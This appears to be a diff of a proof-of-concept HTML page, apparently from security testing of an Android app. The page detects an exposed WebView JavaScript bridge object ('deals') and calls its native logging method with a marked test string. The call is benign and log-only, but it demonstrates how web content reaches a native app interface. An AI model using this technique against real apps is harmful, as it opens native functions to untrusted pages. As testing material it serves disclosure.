@@ -1,12 +1,15 @@
-<h1>bridge</h1><pre id="o"></pre>
+<h1>bridge invoke test</h1><pre id="o"></pre>
 <script>
-var out = "typeof deals = " + (typeof deals) + " | ";
+var o = document.getElementById('o');
+var out = "typeof deals = " + (typeof deals) + "\n";
 if (typeof deals !== "undefined") {
-  var n = [];
-  for (var k in deals) { n.push(k); }
-  out += "count=" + n.length + " | " + n.join(",");
-} else {
-  out += "NOT EXPOSED";
+  try {
+    // benign, log-only method — proves native invocation with attacker data
+    deals.JavascriptInterfaceLogs("POC_MOINKHOKHAR_" + Date.now());
+    out += "invoked deals.JavascriptInterfaceLogs() OK\n";
+  } catch (e) {
+    out += "JavascriptInterfaceLogs threw: " + e + "\n";
+  }
 }
-document.getElementById('o').textContent = out;
+o.textContent = out;
 </script>
